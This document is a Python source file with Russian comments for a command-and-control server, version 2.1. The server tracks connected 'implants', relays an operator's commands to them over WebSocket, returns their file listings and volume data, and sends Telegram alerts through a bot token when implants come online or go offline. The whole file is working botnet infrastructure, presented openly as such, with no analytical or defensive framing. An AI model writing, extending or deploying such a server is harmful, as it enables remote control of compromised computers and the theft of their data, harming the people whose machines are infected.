#
# --- Файл: c2_server.py (Версия 2.1 - Синхронизированный) ---
# Исправлен формат отправки списка ботов, чтобы он совпадал
# с тем, который ожидает index.html v6.6.
#
import asyncio
import json
import os
import threading
import urllib.parse
import urllib.request
from aiohttp import web
import settings

def send_telegram_message(message):
    """Асинхронно отправляет сообщение в Telegram в отдельном потоке."""
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except Exception as e:
            print(f"[!] Ошибка отправки в Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
    global OPERATOR, IMPLANTS

    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)

    client_type, client_id = None, None
    try:
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] Оператор подключился.")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            IMPLANTS[client_id] = { "ws": ws, "initial_data": initial_msg }
            print(f"[+] Новый имплант онлайн: {client_id}")
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}")
            await broadcast_bot_list()
        else:
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping':
                    await ws.send_str('pong')
                    continue

                data = json.loads(msg.data)

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        initial_data = IMPLANTS[target_id].get("initial_data", {})
                        details ={
                            "files": initial_data.get("files"),
                            "volume_state": initial_data.get("volume_state") 
                        }
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})

                elif client_type == 'implant':
                    data['bot_id'] = client_id
                    if OPERATOR and not OPERATOR.closed:
                        await OPERATOR.send_json(data)

    except asyncio.TimeoutError:
        print("[!] Таймаут получения начального сообщения.")
    except Exception as e:
        print(f"[!] Ошибка в websocket_handler: {e}")
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            print(f"[-] Имплант отключился: {client_id}")
            send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] Оператор отключился.")
    return ws

# <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ ЗДЕСЬ >>>
async def broadcast_bot_list():
    """Отправляет оператору детальный список ботов в виде объектов."""
    if OPERATOR and not OPERATOR.closed:
        # Собираем список ОБЪЕКТОВ, а не просто имен
        bot_list_with_details = [{'id': bot_id} for bot_id in IMPLANTS.keys()]
        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_list_with_details})

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"====== C2 SERVER (V2.1 Синхрон) ONLINE на порту {port} ======")
    send_telegram_message("🚀 Сервер запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nСервер остановлен вручную.")
    finally:
        send_telegram_message("🛑 Сервер 'Крепость' остановлен.")
